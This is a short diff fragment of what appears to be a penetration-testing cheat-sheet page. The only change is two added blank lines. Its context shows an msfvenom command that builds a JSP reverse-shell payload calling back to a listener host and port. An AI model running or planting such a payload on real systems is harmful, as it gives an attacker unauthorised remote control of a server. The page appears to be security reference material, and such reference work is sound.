@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:02.586400+00:00'
 ```bash
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
 ```
+
+
